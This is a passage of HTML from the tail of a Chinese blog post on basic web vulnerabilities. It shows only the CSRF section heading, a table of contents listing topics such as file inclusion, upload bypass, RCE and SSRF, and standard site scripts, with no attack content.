+<h2 id="五、CSRF"><a href="#五、CSRF" class="headerlink" title="五、CSRF"></a>五、CSRF</h2></div><div class="article-licensing box"><div class="licensing-title"><p>Web基础漏洞</p><p><a href="https://wkingxc.com/2021/09/28/Web基础漏洞/">https://wkingxc.com/2021/09/28/Web基础漏洞/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Wking</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-09-28</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2023-04-03</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Web%E7%9F%A5%E8%AF%86%E7%82%B9/">Web知识点</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/09/29/XCTF-fakegame/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">XCTF_fakebook</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/09/24/MoeCTF2021_WP/"><span class="level-item">MoeCTF2021_WP</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
+            this.page.url = 'https://wkingxc.com/2021/09/28/Web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/';
+            this.page.identifier = '2021/09/28/Web基础漏洞/';
+        };
+        (function() {
+            var d = document, s = d.createElement('script');  
+            s.src = '//' + 'wkingxc' + '.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#信息泄露"><span class="level-left"><span class="level-item">1</span><span class="level-item">信息泄露</span></span></a></li><li><a class="level is-mobile" href="#一、文件包含漏洞"><span class="level-left"><span class="level-item">2</span><span class="level-item">一、文件包含漏洞</span></span></a></li><li><a class="level is-mobile" href="#二、文件上传漏洞-amp-基本绕过"><span class="level-left"><span class="level-item">3</span><span class="level-item">二、文件上传漏洞&amp;基本绕过</span></span></a></li><li><a class="level is-mobile" href="#三、RCE"><span class="level-left"><span class="level-item">4</span><span class="level-item">三、RCE</span></span></a></li><li><a class="level is-mobile" href="#绕过技巧"><span class="level-left"><span class="level-item">5</span><span class="level-item">绕过技巧</span></span></a></li><li><a class="level is-mobile" href="#四、SSRF-服务端请求构造"><span class="level-left"><span class="level-item">6</span><span class="level-item">四、SSRF(服务端请求构造)</span></span></a></li><li><a class="level is-mobile" href="#五、CSRF"><span class="level-left"><span class="level-item">7</span><span class="level-item">五、CSRF</span></span></a></li></ul></div></div><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.png" alt="Wking&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2023 Wking</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2021-2023</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+            'HTML-CSS': {
+                matchFontHeight: false
+            },
+            SVG: {
+                matchFontHeight: false
+            },
+            CommonHTML: {
+                matchFontHeight: false
+            },
+            tex2jax: {
+                inlineMath: [
+                    ['$','$'],
+                    ['\\(','\\)']
+                ]
+            }
+        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
